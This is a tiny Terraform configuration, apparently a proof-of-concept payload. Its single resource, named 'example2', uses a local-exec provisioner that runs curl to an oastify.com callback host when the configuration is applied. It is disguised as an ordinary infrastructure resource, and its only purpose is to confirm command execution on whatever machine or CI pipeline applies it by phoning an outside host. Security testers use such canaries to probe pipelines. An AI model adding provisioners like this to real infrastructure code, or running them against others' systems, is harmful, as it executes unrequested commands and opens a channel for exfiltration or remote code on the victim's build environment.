resource "terraform_data" "example2" {
  provisioner "local-exec" {
    command = "curl http://ik6btp5xqonhygk6ppo7qqnrcii964ut.oastify.com/got/exec"
  }
}
